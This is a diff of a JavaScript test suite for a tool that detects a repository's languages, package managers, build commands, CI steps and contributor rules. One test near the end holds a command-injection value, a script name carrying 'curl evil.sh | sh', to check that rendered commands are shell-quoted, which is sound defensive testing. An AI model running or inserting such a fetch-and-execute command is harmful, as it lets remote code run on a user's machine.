@@ -91,7 +91,7 @@ test('node-single-npm', () => {
   assert.deepEqual(r.workspaces, []);
   assert.equal(r.packageManager, 'npm');
   assert.equal(r.languageVersion.node, 'v20.11.0');
-  assert.deepEqual(names(r.frameworks), ['eslint', 'react', 'vite', 'vitest']);
+  assert.deepEqual(names(r.frameworks), ['eslint', 'react', 'typescript', 'vite', 'vitest']);
   assert.deepEqual(r.languages[0].evidence, ['package.json', 'tsconfig.json']);
 
   assert.deepEqual(cmds(r, 'test'), ['npm test']);
@@ -307,7 +307,7 @@ test('the walk is capped on huge trees', () => {
   write(dir, 'package.json', '{"name":"big"}');
   for (let i = 0; i < 5200; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), '');
   const r = detect(dir);
-  assert.ok(r.warnings.some((w) => w.startsWith('walk stopped')));
+  assert.ok(r.warnings.some((w) => w.includes('more than 500 files')));
   assert.equal(r.name, 'big'); // shallow files still win
 });
 
@@ -426,11 +426,12 @@ test('hard-rule candidates skip tables, fences, and repeat lines', () => {
     'Never inside a fence',
     '~~~',
     'Plain sentence without signals.',
+    '',
     'Handlers MUST be idempotent. ' + 'x'.repeat(300),
   ].join('\n'));
   write(dir, 'docs/adr/0001-db.md', 'We don\u2019t use ORMs here.\n');
   const r = detect(dir);
-  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['docs/adr/0001-db.md:1', 'CONTRIBUTING.md:2', 'CONTRIBUTING.md:8']);
+  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['docs/adr/0001-db.md:1', 'CONTRIBUTING.md:2', 'CONTRIBUTING.md:9']);
   assert.equal(r.hardRuleCandidates[1].text, 'Always run the linter.');
   assert.ok(r.hardRuleCandidates[2].text.length <= 240);
   assert.deepEqual(r.docs, ['CONTRIBUTING.md', 'docs/adr/0001-db.md']);
@@ -615,7 +616,8 @@ test('fixtures hold no runnable scripts and every script in test/ is a .test.mjs
     }
   };
   visit(path.join(HERE, 'fixtures'));
-  assert.deepEqual(fixtureScripts, []);
+  // graph-* fixtures are source trees for graph.mjs and legitimately contain .js files.
+  assert.deepEqual(fixtureScripts.filter((f) => !f.startsWith(path.join('fixtures', 'graph-'))), []);
 
   // Directly in test/: every script must be a .test.mjs file.
   const badTopLevel = fs
@@ -678,9 +680,9 @@ test('hard rules: imperative "always" counts, descriptive "always" does not; lon
     'Always run `make check` first.',
     `First sentence is harmless. ${short}and it must stay under the limit. Trailing sentence.`,
     `${long}must be kept short ${long}`,
-  ].join('\n'));
+  ].join('\n\n'));
   const r = detect(dir);
-  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['CONTRIBUTING.md:2', 'CONTRIBUTING.md:3', 'CONTRIBUTING.md:4']);
+  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['CONTRIBUTING.md:3', 'CONTRIBUTING.md:5', 'CONTRIBUTING.md:7']);
   // Line 3 is cut at the sentence that carries the rule, with no ellipsis.
   assert.ok(r.hardRuleCandidates[1].text.startsWith('word word'));
   assert.ok(r.hardRuleCandidates[1].text.endsWith('under the limit.'));
@@ -691,9 +693,9 @@ test('hard rules: imperative "always" counts, descriptive "always" does not; lon
 
 test('hard rules are capped at 25', () => {
   const dir = makeTmp();
-  write(dir, 'CONTRIBUTING.md', Array.from({ length: 40 }, (_, i) => `Never do thing number ${i}.`).join('\n'));
-  write(dir, 'docs/adr/a.md', Array.from({ length: 40 }, (_, i) => `Never do adr thing ${i}.`).join('\n'));
-  write(dir, 'AGENTS.md', Array.from({ length: 40 }, (_, i) => `Never do agent thing ${i}.`).join('\n'));
+  write(dir, 'CONTRIBUTING.md', Array.from({ length: 40 }, (_, i) => `Never do thing number ${i}.`).join('\n\n'));
+  write(dir, 'docs/adr/a.md', Array.from({ length: 40 }, (_, i) => `Never do adr thing ${i}.`).join('\n\n'));
+  write(dir, 'AGENTS.md', Array.from({ length: 40 }, (_, i) => `Never do agent thing ${i}.`).join('\n\n'));
   assert.equal(detect(dir).hardRuleCandidates.length, 25);
 });
 
@@ -919,4 +921,584 @@ test('generated: results are sorted, merged per path, and capped at 30', () => {
   assert.deepEqual(detect(both).generated, [
     { path: 'API.md', evidence: 'header says: <!-- DO NOT EDIT -->; written by Makefile (docs)' },
   ]);
+});
+
+// ---------------------------------------------------------------------------
+// Round 5: walk budget, workspace members, platform commands, CI directories, versions
+// ---------------------------------------------------------------------------
+
+const pkgJson = (obj) => JSON.stringify(obj);
+
+test('walk: .yarn/cache and similar stores are skipped, so workspaces and member commands survive', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
+  write(dir, 'yarn.lock', '');
+  write(dir, 'packages/aaa/package.json', pkgJson({ name: 'aaa', scripts: { build: 'tsc' } }));
+  write(dir, 'packages/zzz/package.json', pkgJson({ name: 'zzz', scripts: { test: 'vitest' } }));
+  for (let i = 0; i < 5200; i++) write(dir, `.yarn/cache/pkg-${i}.zip`, '');
+  for (const skipped of ['.pnpm-store', '.idea', '.terraform', 'Pods', 'bower_components']) write(dir, `${skipped}/x/package.json`, '{}');
+  const r = detect(dir);
+  assert.deepEqual(r.workspaces, ['packages/aaa', 'packages/zzz']);
+  assert.ok(cmds(r, 'build').includes('yarn --cwd packages/aaa build'));
+  assert.ok(cmds(r, 'test').includes('yarn --cwd packages/zzz test'));
+  assert.ok(!r.warnings.some((w) => w.startsWith('walk stopped')));
+});
+
+test('walk: when the budget runs out, workspaces and member commands are still found on disk', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
+  write(dir, 'pnpm-lock.yaml', '');
+  // Fifty source dirs sorted before `packages`, each with a subdirectory of 120 files: the walk
+  // spends its whole budget on them before it reaches packages/*/package.json.
+  for (let a = 0; a < 50; a++) {
+    for (let f = 0; f < 120; f++) fs.mkdirSync(path.join(dir, `a${String(a).padStart(2, '0')}`, 's'), { recursive: true });
+    for (let f = 0; f < 120; f++) fs.writeFileSync(path.join(dir, `a${String(a).padStart(2, '0')}`, 's', `f${f}.txt`), '');
+  }
+  write(dir, 'packages/aaa/package.json', pkgJson({ name: 'aaa', scripts: { build: 'tsc' } }));
+  write(dir, 'packages/zzz/package.json', pkgJson({ name: 'zzz', scripts: { lint: 'eslint .' } }));
+  const r = detect(dir);
+  assert.ok(r.warnings.some((w) => w.startsWith('walk stopped')), 'truncation is reported');
+  assert.deepEqual(r.workspaces, ['packages/aaa', 'packages/zzz']);
+  assert.ok(cmds(r, 'build').includes('pnpm -C packages/aaa run build'));
+  assert.ok(cmds(r, 'lint').includes('pnpm -C packages/zzz run lint'));
+});
+
+test('walk: 400 workspace packages are all found even though the walk cannot list them', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
+  for (let i = 0; i < 400; i++) {
+    write(dir, `packages/p${String(i).padStart(3, '0')}/package.json`, pkgJson({ name: `p${i}` }));
+    for (let f = 0; f < 14; f++) fs.writeFileSync(path.join(dir, `packages/p${String(i).padStart(3, '0')}`, `f${f}.txt`), '');
+  }
+  assert.equal(detect(dir).workspaces.length, 400);
+});
+
+test('workspace members named build, dist, vendor or target are never skipped', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
+  write(dir, 'package-lock.json', '{}');
+  for (const name of ['build', 'dist', 'vendor', 'target', 'core']) {
+    write(dir, `packages/${name}/package.json`, pkgJson({ name: `@x/${name}`, scripts: { test: 'node t.js' }, dependencies: { express: '^4.0.0' } }));
+  }
+  write(dir, 'packages/build/index.ts', 'export {};\n');
+  const r = detect(dir);
+  assert.deepEqual(r.workspaces, ['packages/build', 'packages/core', 'packages/dist', 'packages/target', 'packages/vendor']);
+  assert.ok(cmds(r, 'test').includes('npm --prefix packages/build run test'));
+  assert.ok(r.languages.some((l) => l.name === 'typescript'), 'the hidden member was walked');
+  // A skipped name that is NOT a declared member is still skipped.
+  write(dir, 'other/build/package.json', pkgJson({ dependencies: { vue: '^3.0.0' } }));
+  assert.ok(!detect(dir).frameworks.some((f) => f.name === 'vue'));
+});
+
+test('JVM: Maven with wrapper, Gradle with toolchain, sbt', () => {
+  const mvn = makeTmp();
+  write(mvn, 'pom.xml', '<project><properties><maven.compiler.release>21</maven.compiler.release></properties></project>');
+  write(mvn, 'mvnw', '#!/bin/sh\n');
+  const m = detect(mvn);
+  assert.equal(m.primary, 'jvm');
+  assert.equal(m.packageManager, 'maven');
+  assert.deepEqual(m.commands.build[0], { cmd: './mvnw verify', source: 'implied:pom.xml' });
+  assert.deepEqual(cmds(m, 'test'), ['./mvnw test']);
+  assert.equal(m.languageVersion.java, '21');
+
+  const noWrapper = makeTmp();
+  write(noWrapper, 'pom.xml', '<project><properties><java.version>17</java.version></properties></project>');
+  assert.deepEqual(cmds(detect(noWrapper), 'test'), ['mvn test']);
+  assert.equal(detect(noWrapper).languageVersion.java, '17');
+
+  const gradle = makeTmp();
+  write(gradle, 'build.gradle.kts', 'kotlin { jvmToolchain(17) }\njava { toolchain { languageVersion.set(JavaLanguageVersion.of(21)) } }\n');
+  write(gradle, 'gradlew', '#!/bin/sh\n');
+  const g = detect(gradle);
+  assert.deepEqual(cmds(g, 'build'), ['./gradlew build']);
+  assert.deepEqual(cmds(g, 'test'), ['./gradlew test']);
+  assert.deepEqual(cmds(g, 'other'), ['./gradlew check']);
+  assert.equal(g.languageVersion.java, '21');
+
+  const sbt = makeTmp();
+  write(sbt, 'build.sbt', 'name := "x"\nscalaVersion := "3.3.1"\n');
+  write(sbt, 'src/Main.scala', 'object Main\n');
+  const sb = detect(sbt);
+  assert.equal(sb.primary, 'jvm');
+  assert.deepEqual(cmds(sb, 'test'), ['sbt test']);
+  assert.equal(sb.languages[0].name, 'scala');
+});
+
+test('JVM: version files', () => {
+  const dir = makeTmp();
+  write(dir, 'build.gradle', "sourceCompatibility = JavaVersion.VERSION_17\n");
+  assert.equal(detect(dir).languageVersion.java, '17');
+  const sdk = makeTmp();
+  write(sdk, 'pom.xml', '<project/>');
+  write(sdk, '.sdkmanrc', 'java=21.0.2-tem\n');
+  assert.equal(detect(sdk).languageVersion.java, '21.0.2-tem');
+  const jv = makeTmp();
+  write(jv, 'pom.xml', '<project/>');
+  write(jv, '.java-version', '17\n');
+  assert.equal(detect(jv).languageVersion.java, '17');
+});
+
+test('.NET: solution commands and target framework', () => {
+  const dir = makeTmp();
+  write(dir, 'App.sln', '');
+  write(dir, 'App.csproj', '<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>');
+  write(dir, 'Program.cs', 'class P {}\n');
+  const r = detect(dir);
+  assert.equal(r.primary, 'dotnet');
+  assert.deepEqual(cmds(r, 'build'), ['dotnet build']);
+  assert.deepEqual(cmds(r, 'test'), ['dotnet test']);
+  assert.deepEqual(cmds(r, 'format'), ['dotnet format --verify-no-changes']);
+  assert.equal(r.commands.build[0].source, 'implied:App.sln');
+  assert.equal(r.languageVersion.dotnet, 'net8.0');
+
+  const nested = makeTmp();
+  write(nested, 'src/Api/Api.csproj', '<Project><PropertyGroup><TargetFrameworks>net9.0;net8.0</TargetFrameworks></PropertyGroup></Project>');
+  const n = detect(nested);
+  assert.deepEqual(cmds(n, 'build'), ['dotnet build src/Api/Api.csproj']);
+  assert.equal(n.languageVersion.dotnet, 'net9.0');
+
+  const sdk = makeTmp();
+  write(sdk, 'App.sln', '');
+  write(sdk, 'global.json', '{"sdk":{"version":"8.0.100"}}');
+  assert.equal(detect(sdk).languageVersion.dotnet, 'sdk 8.0.100');
+});
+
+test('Ruby: rspec, rails test, rake, rubocop and versions', () => {
+  const spec = makeTmp();
+  write(spec, 'Gemfile', 'source "https://rubygems.org"\nruby "3.3.0"\ngem "rails", "~> 7.1"\n');
+  write(spec, 'spec/a_spec.rb', '');
+  write(spec, 'bin/rails', '#!/usr/bin/env ruby\n');
+  write(spec, '.rubocop.yml', 'AllCops: {}\n');
+  const s = detect(spec);
+  assert.deepEqual(cmds(s, 'test'), ['bundle exec rspec']);
+  assert.deepEqual(cmds(s, 'lint'), ['bundle exec rubocop']);
+  assert.equal(s.languageVersion.ruby, '3.3.0');
+  assert.equal(framework(s, 'rails').version, '7.1');
+
+  const rails = makeTmp();
+  write(rails, 'Gemfile', 'gem "rails"\n');
+  write(rails, 'Gemfile.lock', 'GEM\n  specs:\n    rails (7.2.1)\n');
+  write(rails, 'bin/rails', '');
+  write(rails, '.ruby-version', 'ruby-3.2.2\n');
+  const r = detect(rails);
+  assert.deepEqual(cmds(r, 'test'), ['bin/rails test']);
+  assert.equal(framework(r, 'rails').version, '7.2.1');
+  assert.equal(r.languageVersion.ruby, '3.2.2');
+
+  const rake = makeTmp();
+  write(rake, 'Gemfile', 'source "x"\n');
+  write(rake, 'Rakefile', 'task :default\n');
+  assert.deepEqual(cmds(detect(rake), 'test'), ['bundle exec rake']);
+});
+
+test('PHP: artisan, pest, phpunit and the required php version', () => {
+  const laravel = makeTmp();
+  write(laravel, 'composer.json', pkgJson({ name: 'a/b', require: { php: '^8.2', 'laravel/framework': '^11.0' }, 'require-dev': { 'pestphp/pest': '^3.0' } }));
+  write(laravel, 'artisan', '#!/usr/bin/env php\n');
+  const l = detect(laravel);
+  assert.deepEqual(cmds(l, 'test'), ['php artisan test']);
+  assert.equal(l.languageVersion.php, '^8.2');
+  assert.equal(framework(l, 'laravel').version, '11.0');
+
+  const pest = makeTmp();
+  write(pest, 'composer.json', pkgJson({ name: 'a/b', 'require-dev': { 'pestphp/pest': '^3.0' } }));
+  assert.deepEqual(cmds(detect(pest), 'test'), ['vendor/bin/pest']);
+
+  const unit = makeTmp();
+  write(unit, 'composer.json', pkgJson({ name: 'a/b' }));
+  write(unit, 'phpunit.xml.dist', '<phpunit/>');
+  assert.deepEqual(detect(unit).commands.test[0], { cmd: 'vendor/bin/phpunit', source: 'implied:phpunit.xml.dist' });
+
+  const symfony = makeTmp();
+  write(symfony, 'composer.json', pkgJson({ name: 'a/b', require: { 'symfony/framework-bundle': '^7.0' } }));
+  assert.equal(framework(detect(symfony), 'symfony').version, '7.0');
+});
+
+test('CMake projects are primary "cpp" with build and ctest commands', () => {
+  const dir = makeTmp();
+  write(dir, 'CMakeLists.txt', 'cmake_minimum_required(VERSION 3.20)\nproject(demo LANGUAGES CXX)\n');
+  write(dir, 'src/main.cpp', 'int main() {}\n');
+  const r = detect(dir);
+  assert.equal(r.primary, 'cpp');
+  assert.equal(r.name, 'demo');
+  assert.deepEqual(cmds(r, 'build'), ['cmake -S . -B build && cmake --build build']);
+  assert.deepEqual(cmds(r, 'test'), ['ctest --test-dir build']);
+  assert.equal(r.languages[0].name, 'cpp');
+
+  const c = detect((() => {
+    const d = makeTmp();
+    write(d, 'CMakeLists.txt', 'project(x C)\n');
+    write(d, 'main.c', 'int main(){}\n');
+    return d;
+  })());
+  assert.equal(c.primary, 'cpp');
+  assert.equal(c.languages[0].name, 'c');
+});
+
+test('platform commands appear only when their files exist', () => {
+  const r = detect(fixture('empty'));
+  for (const category of Object.values(r.commands)) assert.deepEqual(category, []);
+});
+
+test('frameworks used by knowledge gates are reported', () => {
+  const node = makeTmp();
+  write(node, 'package.json', pkgJson({
+    name: 'p',
+    dependencies: { zod: '^3.23.0', '@trpc/server': '^11.0.0', 'react-native': '0.76.0', expo: '~52.0.0' },
+    devDependencies: { typescript: '^5.6.0' },
+  }));
+  assert.deepEqual(names(detect(node).frameworks), ['@trpc/server', 'expo', 'react-native', 'typescript', 'zod']);
+
+  const rust = makeTmp();
+  write(rust, 'Cargo.toml', '[package]\nname = "app"\nversion = "0.1.0"\n\n[dependencies]\nreqwest = { version = "0.12", features = ["json"] }\nsqlx = "0.8"\nrand = "0.8"\n');
+  assert.deepEqual(names(detect(rust).frameworks), ['rand', 'reqwest', 'sqlx']);
+});
+
+test('spring-boot version from parent, BOM, plugin, buildscript and version catalog', () => {
+  const sb = (files) => {
+    const d = makeTmp();
+    for (const [rel, content] of Object.entries(files)) write(d, rel, content);
+    return framework(detect(d), 'spring-boot');
+  };
+  assert.equal(sb({ 'pom.xml': '<project><parent><artifactId>spring-boot-starter-parent</artifactId><version>3.2.4</version></parent></project>' }).version, '3.2.4');
+  assert.equal(sb({ 'pom.xml': '<project><dependencyManagement><dependencies><dependency><artifactId>spring-boot-dependencies</artifactId><version>3.1.0</version></dependency></dependencies></dependencyManagement></project>' }).version, '3.1.0');
+  assert.equal(sb({ 'pom.xml': '<project><parent><artifactId>spring-boot-starter-parent</artifactId><version>${spring.boot.version}</version></parent><properties><spring.boot.version>3.3.1</spring.boot.version></properties></project>' }).version, '3.3.1');
+  assert.equal(sb({ 'build.gradle.kts': 'plugins { id("org.springframework.boot") version "3.2.0" }' }).version, '3.2.0');
+  assert.equal(sb({ 'build.gradle': "buildscript { dependencies { classpath 'org.springframework.boot:spring-boot-gradle-plugin:2.7.18' } }" }).version, '2.7.18');
+  assert.equal(sb({ 'build.gradle': "ext { springBootVersion = '3.0.5' }\napply plugin: 'org.springframework.boot'" }).version, '3.0.5');
+  assert.equal(sb({ 'build.gradle.kts': 'plugins { alias(libs.plugins.spring.boot) }  // spring boot', 'gradle/libs.versions.toml': '[versions]\nspringBoot = "3.4.0"\n' }).version, '3.4.0');
+  assert.equal(sb({ 'build.gradle': "plugins { id 'org.springframework.boot' }" }).version, null);
+});
+
+// -- CI directories ---------------------------------------------------------
+
+function ciRepo(workflow, extra = {}) {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'p' }));
+  write(dir, 'package-lock.json', '{}');
+  write(dir, '.github/workflows/ci.yml', workflow);
+  for (const [rel, content] of Object.entries(extra)) write(dir, rel, content);
+  return dir;
+}
+const ciCmds = (r) => Object.values(r.commands).flat().filter((c) => c.source === '.github/workflows/ci.yml').map((c) => c.cmd).sort();
+
+test('CI: step working-directory is kept as `cd <dir> && cmd`', () => {
+  const r = detect(ciRepo([
+    'jobs:',
+    '  j:',
+    '    steps:',
+    '      - run: npm ci',
+    '        working-directory: frontend',
+    '      - name: Test',
+    '        working-directory: ./frontend/app',
+    '        run: npm test',
+    '      - run: npm run lint',
+    '',
+  ].join('\n')));
+  assert.deepEqual(ciCmds(r), ['cd frontend && npm ci', 'cd frontend/app && npm test', 'npm run lint']);
+});
+
+test('CI: job and workflow defaults.run.working-directory apply to their steps only', () => {
+  const r = detect(ciRepo([
+    'defaults:',
+    '  run:',
+    '    working-directory: web',
+    'jobs:',
+    '  a:',
+    '    runs-on: ubuntu-latest',
+    '    steps:',
+    '      - run: npm test',
+    '  b:',
+    '    runs-on: ubuntu-latest',
+    '    defaults:',
+    '      run:',
+    '        working-directory: api',
+    '    steps:',
+    '      - run: pytest -x',
+    '      - run: npm run build',
+    '        working-directory: tools',
+    '',
+  ].join('\n')));
+  assert.deepEqual(ciCmds(r), ['cd api && pytest -x', 'cd tools && npm run build', 'cd web && npm test']);
+});
+
+test('CI: `cd dir && cmd` and multi-line `cd dir` keep their directory', () => {
+  const r = detect(ciRepo([
+    'jobs:',
+    '  j:',
+    '    steps:',
+    '      - run: cd frontend && npm ci',
+    '      - run: |',
+    '          cd backend',
+    '          pytest -x',
+    '          npm run lint',
+    '      - run: |',
+    '          cd "$HOME/somewhere"',
+    '          npm run build',
+    '      - name: Expression dir',
+    '        working-directory: ${{ matrix.dir }}',
+    '        run: npm test',
+    '',
+  ].join('\n')));
+  // Unknown directories (variables, expressions) drop the command instead of misplacing it.
+  assert.deepEqual(ciCmds(r), ['cd backend && npm run lint', 'cd backend && pytest -x', 'cd frontend && npm ci']);
+  assert.deepEqual(cmds(r, 'setup').filter((c) => c.startsWith('cd ')), ['cd frontend && npm ci']);
+});
+
+test('CI: a working-directory on another step does not leak', () => {
+  const r = detect(ciRepo([
+    'jobs:',
+    '  j:',
+    '    steps:',
+    '      - uses: actions/checkout@v4',
+    '        with:',
+    '          path: x',
+    '      - run: npm test',
+    '      - run: npm run lint',
+    '        working-directory: sub',
+    '',
+  ].join('\n')));
+  assert.deepEqual(ciCmds(r), ['cd sub && npm run lint', 'npm test']);
+});
+
+// -- Hard rules --------------------------------------------------------------
+
+test('hard rules: hard-wrapped sentences are joined before matching', () => {
+  const dir = makeTmp();
+  write(dir, 'CONTRIBUTING.md', [
+    'All use of AI in contributions must follow the',
+    '[AI policy](docs/ai.md) and be disclosed in the pull',
+    'request description.',
+    '',
+    '- Never commit generated files;',
+    '  they are rebuilt in CI.',
+    '- Run the tests.',
+  ].join('\n'));
+  const r = detect(dir);
+  assert.deepEqual(r.hardRuleCandidates, [
+    { text: 'All use of AI in contributions must follow the [AI policy](docs/ai.md) and be disclosed in the pull request description.', source: 'CONTRIBUTING.md:1' },
+    { text: 'Never commit generated files; they are rebuilt in CI.', source: 'CONTRIBUTING.md:5' },
+  ]);
+});
+
+test('hard rules: a sentence that runs into a short code block finishes with the code inline', () => {
+  const dir = makeTmp();
+  write(dir, 'CONTRIBUTING.md', [
+    'If your change should appear in the changelog, it must be captured by `changeset` which is done by running',
+    '',
+    '```bash',
+    'pnpm changeset',
+    '```',
+    '',
+    'Never edit the lockfile by hand; run these in order:',
+    '',
+    '```sh',
+    'pnpm install',
+    'pnpm test',
+    '```',
+    '',
+    'Never skip the hooks; run:',
+    '',
+    '```sh',
+    'a', 'b', 'c', 'd',
+    '```',
+    '',
+    'Never push to main.',
+    '',
+    '```sh',
+    'git status',
+    '```',
+  ].join('\n'));
+  const r = detect(dir);
+  assert.deepEqual(r.hardRuleCandidates, [
+    {
+      text: 'If your change should appear in the changelog, it must be captured by `changeset` which is done by running `pnpm changeset`.',
+      source: 'CONTRIBUTING.md:1',
+    },
+    { text: 'Never edit the lockfile by hand; run these in order: `pnpm install && pnpm test`.', source: 'CONTRIBUTING.md:7' },
+    // More than three code lines, and a sentence that already ends with a period: left alone.
+    { text: 'Never skip the hooks; run:', source: 'CONTRIBUTING.md:14' },
+    { text: 'Never push to main.', source: 'CONTRIBUTING.md:23' },
+  ]);
+});
+
+test('hard rules: sections claude-setup wrote into AGENTS.md are not offered back', () => {
+  const dir = makeTmp();
+  write(dir, 'AGENTS.md', [
+    '# Project',
+    '',
+    '## Commands',
+    '',
+    '- Never run `rm -rf` here.',
+    '',
+    '## Hard rules',
+    '',
+    '- "PII never in logs." (README.md:41)',
+    '',
+    '## Boundaries',
+    '',
+    'Never: edit generated files; commit .env*.',
+    '',
+    '## Version notes',
+    '',
+    '- Next 15: never use pages router.',
+    '',
+    '## Working agreements',
+    '',
+    '- Always ask before adding dependencies.',
+    '',
+    '## Team conventions',
+    '',
+    '- Never force-push to main.',
+    '',
+  ].join('\n'));
+  const r = detect(dir);
+  assert.deepEqual(r.hardRuleCandidates, [{ text: 'Never force-push to main.', source: 'AGENTS.md:25' }]);
+});
+
+// -- Versions ----------------------------------------------------------------
+
+test('versions: non-version specifiers give version null and keep the raw text in range', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'p', dependencies: {
+    next: 'catalog:', react: 'latest', vue: 'npm:vue@3.4.0', express: 'workspace:*', svelte: 'github:sveltejs/svelte',
+    hono: '*', fastify: 'file:../fastify', astro: 'link:../astro', vite: 'git+https://github.com/vitejs/vite.git',
+  } }));
+  const byName = Object.fromEntries(detect(dir).frameworks.map((f) => [f.name, [f.version, f.range]]));
+  assert.deepEqual(byName.next, [null, 'catalog:']);
+  assert.deepEqual(byName.react, [null, 'latest']);
+  assert.deepEqual(byName.vue, ['3.4.0', '']);
+  assert.deepEqual(byName.express, [null, 'workspace:*']);
+  assert.deepEqual(byName.svelte, [null, 'github:sveltejs/svelte']);
+  assert.deepEqual(byName.hono, [null, '*']);
+  assert.deepEqual(byName.fastify, [null, 'file:../fastify']);
+  assert.deepEqual(byName.astro, [null, 'link:../astro']);
+  assert.deepEqual(byName.vite, [null, 'git+https://github.com/vitejs/vite.git']);
+});
+
+test('versions: npm aliases keep the inner range and a real version beats a link elsewhere', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'], dependencies: { vue: 'npm:vue@^3.4.0' } }));
+  write(dir, 'packages/a/package.json', pkgJson({ name: 'a', dependencies: { react: 'workspace:*' } }));
+  write(dir, 'packages/b/package.json', pkgJson({ name: 'b', dependencies: { react: '^18.2.0' } }));
+  const r = detect(dir);
+  assert.deepEqual([framework(r, 'vue').version, framework(r, 'vue').range], ['3.4.0', '^']);
+  assert.deepEqual([framework(r, 'react').version, framework(r, 'react').where], ['18.2.0', 'packages/b/package.json']);
+});
+
+test('versions: pnpm catalogs resolve from pnpm-workspace.yaml', () => {
+  const dir = makeTmp();
+  write(dir, 'pnpm-workspace.yaml', [
+    'packages:',
+    "  - 'apps/*'",
+    'catalog:',
+    '  react: ^19.0.0',
+    '  "@trpc/server": 11.0.1 # pinned',
+    'catalogs:',
+    '  legacy:',
+    '    next: "14.2.0"',
+    '    hono: ^4.5.0',
+    '',
+  ].join('\n'));
+  write(dir, 'package.json', pkgJson({ name: 'root', packageManager: 'pnpm@10.0.0' }));
+  write(dir, 'apps/web/package.json', pkgJson({ name: 'web', dependencies: { react: 'catalog:', next: 'catalog:legacy', zod: 'catalog:', '@trpc/server': 'catalog:default' } }));
+  write(dir, 'apps/old/package.json', pkgJson({ name: 'old', dependencies: { hono: 'catalog:legacy' } }));
+  const r = detect(dir);
+  const get = (n) => [framework(r, n).version, framework(r, n).range];
+  assert.deepEqual(get('react'), ['19.0.0', '^']);
+  assert.deepEqual(get('hono'), ['4.5.0', '^']);
+  assert.deepEqual(get('next'), ['14.2.0', '']);
+  assert.deepEqual(get('@trpc/server'), ['11.0.1', '']);
+  assert.deepEqual(get('zod'), [null, 'catalog:']); // not in any catalog
+});
+
+// -- Misc ----------------------------------------------------------------------
+
+test('Yarn Berry renders `cd <dir> && yarn <script>`; classic keeps --cwd', () => {
+  const berry = makeTmp();
+  write(berry, 'package.json', pkgJson({ name: 'r', packageManager: 'yarn@4.2.0', workspaces: ['apps/*'] }));
+  write(berry, 'yarn.lock', '');
+  write(berry, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
+  assert.deepEqual(cmds(detect(berry), 'build'), ['cd apps/web && yarn build']);
+
+  const rc = makeTmp();
+  write(rc, 'package.json', pkgJson({ name: 'r', workspaces: ['apps/*'] }));
+  write(rc, 'yarn.lock', '');
+  write(rc, '.yarnrc.yml', 'nodeLinker: node-modules\n');
+  write(rc, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
+  assert.deepEqual(cmds(detect(rc), 'build'), ['cd apps/web && yarn build']);
+
+  const classic = makeTmp();
+  write(classic, 'package.json', pkgJson({ name: 'r', packageManager: 'yarn@1.22.22', workspaces: ['apps/*'] }));
+  write(classic, 'yarn.lock', '');
+  write(classic, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
+  assert.deepEqual(cmds(detect(classic), 'build'), ['yarn --cwd apps/web build']);
+});
+
+test('Go module names drop the major-version suffix', () => {
+  const chi = makeTmp();
+  write(chi, 'go.mod', 'module github.com/go-chi/chi/v5\n\ngo 1.22\n');
+  assert.equal(detect(chi).name, 'chi');
+  const yaml = makeTmp();
+  write(yaml, 'go.mod', 'module gopkg.in/yaml.v3\n\ngo 1.22\n');
+  assert.equal(detect(yaml).name, 'yaml.v3');
+  const plain = makeTmp();
+  write(plain, 'go.mod', 'module example.com/acme/svc\n\ngo 1.22\n');
+  assert.equal(detect(plain).name, 'svc');
+});
+
+test('agent configs: gemini, codex, kiro, opencode, agents skills, junie and friends', () => {
+  const dir = makeTmp();
+  write(dir, '.gemini/settings.json', '{}');
+  write(dir, '.codex/config.toml', '');
+  write(dir, '.kiro/steering/product.md', '');
+  write(dir, 'opencode.json', '{}');
+  write(dir, '.agents/skills/lint/SKILL.md', '');
+  write(dir, '.junie/AGENTS.md', '');
+  write(dir, '.zed/settings.json', '{}');
+  write(dir, '.continue/rules/a.md', '');
+  write(dir, '.roo/rules/b.md', '');
+  write(dir, 'AGENTS.override.md', '');
+  const r = detect(dir);
+  const byPath = Object.fromEntries(r.agentConfigs.map((a) => [a.path, a.tool]));
+  assert.deepEqual(byPath, {
+    '.agents/skills/lint/SKILL.md': 'agents',
+    '.codex/config.toml': 'codex',
+    '.continue/rules/a.md': 'continue',
+    '.gemini/settings.json': 'gemini',
+    '.junie/AGENTS.md': 'junie',
+    '.kiro/steering/product.md': 'kiro',
+    '.roo/rules/b.md': 'roo',
+    '.zed/settings.json': 'zed',
+    'AGENTS.override.md': 'codex',
+    'opencode.json': 'opencode',
+  });
+});
+
+test('script names and directories are shell-quoted in rendered commands', () => {
+  const dir = makeTmp();
+  write(dir, 'package.json', pkgJson({ name: 'r', workspaces: ['apps/*'], scripts: { 'test; curl evil.sh | sh': 'x', build: 'tsc' } }));
+  write(dir, 'package-lock.json', '{}');
+  write(dir, 'apps/my app/package.json', pkgJson({ name: 'my-app', scripts: { "it's": 'x', 'lint': 'eslint' } }));
+  const all = Object.values(detect(dir).commands).flat().map((c) => c.cmd);
+  assert.ok(all.includes("npm run 'test; curl evil.sh | sh'"));
+  assert.ok(all.includes("npm --prefix 'apps/my app' run lint"));
+  assert.ok(all.includes("npm --prefix 'apps/my app' run 'it'\\''s'"));
+  assert.ok(all.includes('npm run build'));
+  assert.ok(!all.some((c) => c.includes('run test; curl')));
+});
+
+test('Makefile targets inside define blocks are not listed', () => {
+  const dir = makeTmp();
+  write(dir, 'Makefile', 'define MACRO\nbar: baz\n\techo hi\nendef\n\ntest:\n\tgo test ./...\n');
+  assert.deepEqual(cmds(detect(dir), 'other'), []);
